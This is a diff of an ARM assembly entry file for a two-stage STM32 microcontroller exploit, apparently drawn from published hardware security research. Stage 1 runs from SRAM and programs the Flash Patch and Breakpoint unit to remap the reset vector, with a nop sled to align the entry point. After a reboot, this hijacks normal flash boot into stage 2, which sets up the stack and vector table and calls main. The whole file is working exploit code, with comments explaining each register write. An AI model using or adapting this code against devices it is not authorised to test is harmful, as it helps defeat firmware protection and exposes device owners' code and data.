@@ -1,90 +1,118 @@
 
-/* 
- * Stage 1 of the exploit target firmware
- * This is the entry point for the exploit which will
- * set up the FPB to hijack the flash boot to jump to
- * stage 2
- * 
- * This part has been left unmodified from the original
- * firmware, which can be found here:
- * https://github.com/JohannesObermaier/f103-analysis/tree/master/h3
+/*
+ * Entrypoint for both stages.
+ *
+ * Stage 1 is executed from SRAM after booting into SRAM mode (BOOT1: 1, BOOT0: 1).
+ * The FPB is activated to ensure the next boot enters stage 2, then enters an infinite
+ * loop waiting for power to be cut. Once the system reboots, it enters normal flash boot
+ * (BOOT1: 0, BOOT0: 0), the FPB patches address 0x00000004 to redirect to SRAM, and
+ * the system enters stage 2.
  */
-
+.global _start_stage1
+.global _start_stage2
 .global _start
 .syntax divided
 .thumb
 
 .section .isr_vector
-isrVectors:
+.thumb
+isr_vectors:
+	/* The STM32F4 will consult this address to determine the stack pointer address. */
 	.word 0x20005000
-	.word _start+1
+	/* The STM32F4 will consult this address to determine the entrypoint */
+	.word _start_stage1+1
+	/* The next six words serve double-duty: They act as a normal vector table,
+	 * and they pad it out so that the word pointing to _start_stage2 is at offset
+	 * 0x20 from the start.
+	 */
 	.word vecNMI+1
 	.word vecHardfault+1
 	.word vecMemMan+1
 	.word 0
 	.word 0
 	.word 0
-/* These is the stage 2 entry point */
-	.word stage2+1
+/* These is the stage 2 entry point. It must be at offset 0x20, to ensure
+ * it ends up at 0x20000020 so the FPB can refer to it. At startup, the CPU
+ * will load this value into the program counter instead of the address at
+ * 0x00000004. Ensure the LSB is set as it is Thumb2 code.
+ */
+stage2_pointer:
+	.word _start_stage2+1
 
-.section .entryVec
-	b _start
+/* For STM32F1, a hardcoded entrypoint is used. This entrypoint may be any one of the following:
+ *	- 0x20000108
+ *	- 0x200001cc
+ *	- 0x200001e0
+ * depending on how many interrupt vectors a particular target has. To work around this,
+ * we fill the entire address with a nop sled to ensure the entrypoint is positioned at least
+ * at 0x200001e0.
+ */
 
-.section .text
-.thumb
-_start: /* stage 1 */
-	ldr r0, =0xe0002000
-        movs r1, #3                                                                                  
-        movs r3, #0x05                                                                                  
-        movs r2, #0x20                                                                               
-        stm r0!, {r1, r2, r3}                                                                      
-sinfl:  b sinfl
+/* nop sled to ensure _start_stage1 is located after 0x200001e0 */
+nop_sled:
+.rept 230
+	nop
+.endr
+
+_start_stage1: /* stage 1 */
+	ldr r0, =0xe0002000		/* FPB Address Space */
+
+	/* FP_CTRL: Enable FPB (bit 0) with key set (bit 1) */
+	movs r1, #3
+
+	/* FP_REMAP: All addresses are relative to 0x20 in the system space (i.e. 0x20000020) */
+	movs r2, #0x20
+
+	/* FP_COMP0: Enable (bit 0) and remap address 4
+	 * Since this is comparison 0, it will remap to the remap address + 0,
+	 * i.e. 0x20000020
+	 */
+	movs r3, #0x05
+
+	/* Write all three values into the FPB address space */
+	stm r0!, {r1, r2, r3}
+
+sinfl:
+	/* Spin forever waiting for the exploit to be triggered */
+	b sinfl
 
 
-stage2:	
-	/* Update the FPB */
-	ldr r0, =0xe0002000
-        movs r1, #3                                                                                  
-        movs r3, #0x05                                                                                  
-        movs r2, #0x20                                                                               
-        stm r0!, {r1, r2, r3}                                                                      
-	
-	/* Set stack pointer */
-	ldr r0, =isrVectors
+_start:
+_start_stage2:
+	/* Set stack pointer by reading it out of the vector table */
+	ldr r0, =isr_vectors
 	ldr r0, [r0]
 	mov sp, r0
 
+	/* Enable interrupts */
 	cpsie if
 	
 	/* Configure VTOR */
 	ldr r0, =0xe000ED08
-	ldr r1, =isrVectors
+	ldr r1, =isr_vectors
 	str r1, [r0]
 
+	/* Zero out .bss */
 	ldr r0, =_bss_end
 	ldr r1, =_bss_start
 	mov r3, #0
 
-clrloop:strd r3, r3, [r1]
+	/* NOTE: There is no .data section as we're running from RAM -- it's all .text */
+
+clrloop:
+	strd r3, r3, [r1]
 	add r1, r1, #8
 	cmp r1, r0
 	bne clrloop
 
 	bl main
 
-	infloop:
+infloop:
 	b infloop
 
 
-.section .text
 vecNMI:
 vecHardfault:
 vecMemMan:
 	mrs r0, IPSR
 	b alertCrash
-
-.section .data
-.word 0x12345678
-
-errVect:
-	.word 0x00000000
